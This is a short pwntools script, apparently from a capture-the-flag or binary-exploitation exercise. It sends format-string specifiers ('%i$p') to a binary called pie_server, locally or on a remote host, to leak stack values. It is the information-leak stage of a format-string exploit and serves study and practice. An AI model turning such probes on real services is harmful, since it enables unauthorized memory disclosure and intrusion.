from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './pie_server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

for i in range(100):
    try:
       io = start()
       io.sendlineafter(b':', f'%{i}$p') 
       io.recvuntil(b'Hello ')
       result = io.recvline()
       print(str(i) + ': ' + str(result))
       io.close()
    except EOFError: 
        pass